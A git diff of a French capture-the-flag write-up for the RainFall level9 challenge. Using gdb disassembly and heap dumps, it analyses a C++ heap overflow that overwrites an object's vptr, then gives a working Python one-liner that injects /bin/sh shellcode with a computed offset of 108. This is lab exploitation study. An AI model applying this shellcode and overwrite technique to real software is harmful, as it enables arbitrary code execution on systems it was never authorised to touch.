@@ -116,26 +116,26 @@ Dump of assembler code for function main:
    0x08048670 <+124>:	mov    0x14(%esp),%eax                      
    0x08048674 <+128>:	mov    %eax,(%esp)                          
    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>  
-                        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                        (gdb) disas _ZN1N13setAnnotationEPc
-                        0x0804870e <+0>:	push   %ebp                                                                                                                 (gdb) x/60wx 0x804a000
-                        0x0804870f <+1>:	mov    %esp,%ebp                    Ici notre fonction utilise strlen() sur notre argument AV[1] afin de 		            0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
-                        0x08048711 <+3>:	sub    $0x18,%esp                   pouvoir utiliser memcpy() en lui passant comme paramètre :                                      0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
-                        0x08048714 <+6>:	mov    0xc(%ebp),%eax               - la length de notre AV[1] -> n                                                         ...
-                        0x08048717 <+9>:	mov    %eax,(%esp)                  - notre AV[1] -> src                                                                    0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
-                        0x0804871a <+12>:	call   0x8048520 <strlen@plt>       - l'adresse de notre 1er objet -> dest                                                  ...
-                        0x08048722 <+20>:	add    $0x4,%edx                    void *memcpy(void *dest, const void *src, size_t n);                                    
-                        0x08048725 <+23>:	mov    %eax,0x8(%esp)                                                                                                       On peut constater 0x41414141 aprés le vptr de notre 1er objet
-                        0x0804871f <+17>:	mov    0x8(%ebp),%edx                                                                                                       Il est intéterssant de constater que nous pouvons donc réécrire
-                        0x08048729 <+27>:	mov    0xc(%ebp),%eax               On copie donc AV[1] dans l'espace memoire alloué pour notre 1er objet.                  le vptr de notre 2nd objet avec un overflow.
-                        0x0804872c <+30>:	mov    %eax,0x4(%esp)               Verifions cela sur la heap --> Breakpoint 1, 0x0804867c in main ()                      
-                        0x08048730 <+34>:	mov    %edx,(%esp)                                                                                                          Aprés calcul de l'offset on obtient : 108
-                        0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
-                        0x08048738 <+42>:	leave
-                        0x08048739 <+43>:	ret           
-                        ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+                        --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+                        (gdb) disas _ZN1N13setAnnotationEPc																								|											
+                        0x0804870e <+0>:	push   %ebp                                                                                                                 (gdb) x/60wx 0x804a000							|
+                        0x0804870f <+1>:	mov    %esp,%ebp                    Ici notre fonction utilise strlen() sur notre argument AV[1] afin de 		    0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141	|
+                        0x08048711 <+3>:	sub    $0x18,%esp                   pouvoir utiliser memcpy() en lui passant comme paramètre :                              0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000	|
+                        0x08048714 <+6>:	mov    0xc(%ebp),%eax               - la length de notre AV[1] -> n                                                         ...										|
+                        0x08048717 <+9>:	mov    %eax,(%esp)                  - notre AV[1] -> src                                                                    0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000	|
+                        0x0804871a <+12>:	call   0x8048520 <strlen@plt>       - l'adresse de notre 1er objet -> dest                                                  ...										|
+                        0x08048722 <+20>:	add    $0x4,%edx                    void *memcpy(void *dest, const void *src, size_t n);                                    										|
+                        0x08048725 <+23>:	mov    %eax,0x8(%esp)                                                                                                       On peut constater 0x41414141 aprés le vptr de notre 1er objet		|
+                        0x0804871f <+17>:	mov    0x8(%ebp),%edx                                                                                                       Il est intéterssant de constater que nous pouvons donc réécrire		|
+                        0x08048729 <+27>:	mov    0xc(%ebp),%eax               On copie donc AV[1] dans l'espace memoire alloué pour notre 1er objet.                  le vptr de notre 2nd objet avec un overflow.				|
+                        0x0804872c <+30>:	mov    %eax,0x4(%esp)               Verifions cela sur la heap --> Breakpoint 1, 0x0804867c in main ()                      										|
+                        0x08048730 <+34>:	mov    %edx,(%esp)                                                                                                          Aprés calcul de l'offset on obtient : 108					|
+                        0x08048733 <+37>:	call   0x8048510 <memcpy@plt>																						|						
+                        0x08048738 <+42>:	leave																									|	
+                        0x08048739 <+43>:	ret           																								|						
+                        --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                         
-   -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+   -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                      
    0x0804867c <+136>:	mov    0x10(%esp),%eax ______EAX____ 0x0804a078 _________ 2nd objet             Au fil de l'étude de l'asm nous n'avons à aucun moment
    0x08048680 <+140>:	mov    (%eax),%eax     ______EAX____ 0x08048848 _________ vptr                  pu constater l'appel de "\bin\sh" ou encore un cat du 
@@ -150,19 +150,21 @@ Dump of assembler code for function main:
    0x08048699 <+165>:	ret
 					     	      Il nous faut donc une première adresse VPTR qui sera déréferencée XXXX et stocké dans EDX puis c'est
 End of assembler dump.				      (*edx) le contenue de l'adresse XXXX SHELLCODE est call
-_____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+_________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
 
 
-Montons notre exploit :
+À l'aide de tou ce que l'on a analysé montons notre exploit :
 
-______BUFFER_______
- [SHELLCODE][XXXX]
-     XXXX    VPTR
+__________BUFFER__________
+ [SHELLCODE][AAAAAA][XXXX]   ------------> contenu
+     XXXX            VPTR    ------------> adresse
+
 
 Nous allons réécrire notre vptr avec une adresse du début de notre buffer 0x804a00c
 Qui elle contiendra l'adresse suivante sur le buffer 0x804a010
 Qui elle contiendra notre SHELLCODE !!! 
 
+RAPPEL : OFFSET = 108
 
 level9@RainFall:~$ ./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'")
 $ whoami
